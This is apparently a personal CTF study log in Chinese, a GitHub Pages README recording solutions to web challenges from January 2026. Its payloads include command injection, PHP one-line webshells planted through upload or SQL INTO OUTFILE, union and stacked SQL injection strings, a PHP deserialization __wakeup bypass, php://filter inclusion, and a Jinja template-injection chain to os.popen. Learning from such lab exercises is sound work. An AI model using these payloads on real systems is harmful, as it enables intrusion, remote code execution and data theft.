# Levivan.github.io
学习记录
2026.1.8
1.登录
随便登入
bp抓包（输入账号密码后）
intruder爆破寻找长度不一样的
repeater go
2.php代码
弱类型比较
$a==$b等于
$a===$b全等
3.robot协议
url后输入/robots.txt
4.ping没写waf
command1 && command2 先执行 command1，如果为真，再执行command2 
command1 | command2   只执行 command2 
command1 & command2   先执行command2后执行command1 
command1 || command2  先执行 command1，如果为假，再执行command2 
命令执行漏洞（| || & && 称为 管道符） 
127.0.0.1&&ls
./返回上一级目录
cat命令127.0.0.1 && cat ../../../../home/flag.txt
5.请求头
php尝试index.php,F12查看network看请求头
或者bp抓包送到repeater
6.伪造xff（X-Forwarded-For）和referer
插件改请求头或者bp抓包改请求头和ip
7.常见的备份文件后缀名：.git .svn .swp .~ .bak .bash_history加在路由后面
8.URI/目录（index.php）
9.get请求以？为分割符，以&为并列请求
  post请求 requests.post(url,data)
10.js
出现以逗号隔开的数字
python将其翻译为ASCII码
s=[55,56,54,79,115,69,114,116,107,49,50]
for i in s:
print(chr(i),end=")
2026.1.9
1.php2
php相关现在url后先添加index.php，没有区别尝试index.phps(源代码)
url解码：%+ASCII的十六进制
例一：%25  ：25就是十六进制的 % ，整个解码就是 % 
例二：%61 ：61是十六进制的a : 整个解码就是 a 
构造payload ： http://111.198.29.45:48961/?id=%2561dmin 
%25 通过url栏变成%，%61通过urldecode变成a，配合成id=admin
2.ics06
只有报表中心可以打开，url显示id=1无法修改，bp抓包爆破,找到明显长度不同的payload2333，id改为2333
3.php的序列化与反序列化
绕过_wakeup（）函数
<?php
class xctf{                      //定义一个名为xctf的类
public $flag = '111';            //定义一个公有的类属性$flag，值为111
public function __wakeup(){      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
exit('bad requests');
}
}
$test = new xctf();           //使用new运算符来实例化该类（xctf）的对象为test
echo(serialize($test));       //输出被序列化的对象（test）
?>
输出O:4:"xctf":1:{s:4:"flag";s:3:"111";}
要绕过_wakeup(),修改1为2
4.php_rce
thinkphp漏洞*
5.php的文件包含类型
审计php代码,while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。
御剑扫描进入sql注入区域编辑一句话木马select "<?php eval($_POST[aaaa]);?>"  into ourfile '/tmp/yihua.php' 
打开中国蚁剑输入url和密码发现flag
2026.1.10
1.upload
浏览器绕过验证，一句话木马脚本php:<?php@eval($_POST['chopper']);?>
bp抓包后修改jpg后缀改为php
链接菜刀输入url地址找到flag
2.warmup
一张图片打开f12发现<!--source.php-->，访问source.php,发现需要访问hint.php
访问后出现提示flag not here, and flag in ffffllllaaaagggg
构造payload满足代码条件即file=hint.php
访问上一个文件目录，直到找到ffffllllaaaagggg（五个if回退6次）
执行查看文件ffffllllaaaagggg的命令找到flag
3.sql注入
猜字段1' union select 1,2,3# 
爆破数据库名1' union select 1,database(),3# 返回3
爆破表名1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="news"# 
爆破列名1' union select 1, group_concat(column_name),3 from information_schema.columns where table_name="secret_table" # 
出现flag提示  读取数据1' union select 1,fl4g,3 from secret_table# 
4.php反序列化
魔术方法_wakeup()  使用unserialize()函数反序列化一个对象
构造payload注意base64解码  绕过wakeup
<?php 
class Demo {  
    private $file = 'index.php'; 
    public function __construct($file) {  
        $this->file = $file;  
    } 
    function __destruct() {  
        echo @highlight_file($this->file, true);  
    } 
    function __wakeup() {  
        if ($this->file != 'index.php') {  
            //the secret is in the fl4g.php 
            $this->file = 'index.php';  
        }  
    }  
} 
$flag = new Demo('fl4g.php'); 
$flag = serialize($flag); 
$flag = str_replace('O:4', 'O:+4',$flag); // 绕过正则 
$flag = str_replace(':1:', ':2:' ,$flag);  //绕过wakeup
echo base64_encode($flag);   //对参数进行base编码 
?>
传递var参数
5.inget（sql注入）
构造payload 
先尝试万能密码id=' or ''='直接给了flag
2026.1.11
1.sql注入（supersqli）
首先提交表单，出现提示
暴库 index.php?inject=1';and union select 1,2,3,4 %23
index.php?inject=1';show database %23
尝试堆叠注入 爆表： show tables 23% 出现表名1919810931114514
爆列查看表 出现flag提示
根据关键字handler，使用handler语句  /index.php?inject=1';handler `1919810931114514`open;handler `1919810931114514`read first %23
#思路：爆字段，爆库名，表名，列名，找到flag
2.逆向加密算法
要将一串乱码解密
分析代码加密逻辑编译解密程序：
循环开始：给encode一个参数 $str
将所传参数 $str 通过 strrev() 函数反转字符串操作并赋值给 $_o
循环遍历 变量 $_o
在for循环中首先依次取字符串 $_o 的第 $_0 个值，赋值给 $_c
将变量 $c 转化为 ASCII码 并 +1，赋值给 $_
将 $__ 转化为该ASCII码所对应的字符，赋值给 $_c
拼接字符串，赋值给 $_ , 循环结束。
将拼接好后的字符串 $_ 进行 base64编码
将编码后的值进行反转字符串操作
对反转后的字符串进行 rot13 加密
得出结果为 $miwen
其中用到的php函数：
strrev(string): 反转字符串
strlen(string): 返回字符串的长度
substr(string, start, length): 返回字符串的一部分
string: 所需要的字符串
start: 在字符串何处开始
length: 可选。规定被返回字符串的长度。默认是直到字符串的结尾
ord(string): 返回字符串首个字符的 ASCII 值
chr(): 从指定的 ASCII 值返回对应的字符
str_rot13(string): 对字符串执行 ROT13 编码。
ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变
编码和解码都是由该函数完成的。如果把已编码的字符串作为参数，那么将返回原始字符串
base64_encode(string): 使用 MIME base64 对数据进行编码
<?php 
   $miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"; 
   function decode($miwen){ 
        $_o=base64_decode(strrev(str_rot13($miwen))); 
        //echo $_o; 
        for($_0=0;$_0<strlen($_o);$_0++) 
        { 
            $_c=substr($_o,$_0,1); 
            $__=ord($_c)-1; 
            $_c=chr($__); 
            $_=$_.$_c; 
        } 
        return strrev($_);  
        
   } 
   echo decode($miwen);     
?> 
运行得到flag
2026.1.12
1.fileclude（伪协议绕过）
查看源代码，改url为flag.php
出现错误，发现file1 和file2都需要传参
file_get_contents函数可以使用php伪协议绕过
Payload:
?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain;base64,aGVsbG8gY3Rm     
#php://filter:读取源代码并进行base64编码输出        
#data://:自PHP>=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输
得到base64的flag
解密base64
2.python template injection模板注入
模板文件（如`html`）可以直接使用`python template injection`命令来调用
模板注入，就是指**将一串指令代替变量传入模板中让它执行**
```python
def test():
code = request.args.get('id')
html = '''
<h3>%s</h3>
'''%(code)
return render_template_string(html)
```
以这段代码为例，我们在传入`code`值时，可以用`{{}}`符号来包裹一系列代码，以此替代本应是参数的`id`：
```
http://..../?id={{代码}}
```
思路：首先进行模板注入的测试`http://111.198.29.45:46675/{{7*7}}`
可以注入
题目告诉我们这是一个python注入问题，那么脚本肯定也是python的，思
考怎样用python语句获取控制台权限：想到了`os.system`和`os.popen` ([参考资
料](https://blog.csdn.net/sxingming/article/details/52071514)),这两句前者返回**退出状态码** ,后者**以file形式**返回**输出内容**,我们想要的是内容，所以选择`os.popen`
-__class__：返回对象所属的类
__mro__：返回一个类所继承的基类元组，方法在解析时按照元组的
顺序解析。
__base__：返回该类所继承的基类
// __base__和__mro__都是用来寻找基类的
__subclasses__：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__：类的初始化方法
__globals__：对包含函数全局变量的字典的引用-首先，找到当前变量所在的类：
`111.198.29.45:46675/%7B%7B''.__class__%7D%7D`
服务器回复：
`URL http://111.198.29.45:46675/<type 'str'> not found`
发现这个回复里已经告诉我们这个变量的类是'str'了。
-接下来，从这个类找到它的基类：
`http://111.198.29.45:46675/%7B%7B''.__class__.__mro__%7D%7D`
服务器回复：
`URL http://111.198.29.45:46675/(<type 'str'>, <type 'basestring'>, <type 'object'>) not found`
-然后，通过基类来找其中任意一个基类的引用列表：
`http://111.198.29.45:46675/%7B%7B''.__class__.__mro__[2].__subclasses__()%7D%7D`
服务器回复了很长的一个列表，从其中可以找到我们想要的`os`所在的`site._Printer`类，它在列表的第七十二位，即`__subclasses__()[71]`。-通过`__subclasses__()[71].__init__.__globals__['os'].popen('命令行语句').read()`来**调用服务器的控制台** **并显示**，这下我们就可以随便用控制台输出了。
直接填命令语句：
`http://111.198.29.45:46675/%7B%7B''.__class__.__mro__[2].__sub
classes__()[71].__init__.__globals__['os'].popen('ls').read()%7D%7D`
找到了一个fl4g index.py文件，运行cat命令查看该文件(把popen括号后的ls改为cat fl4g)   找到flag
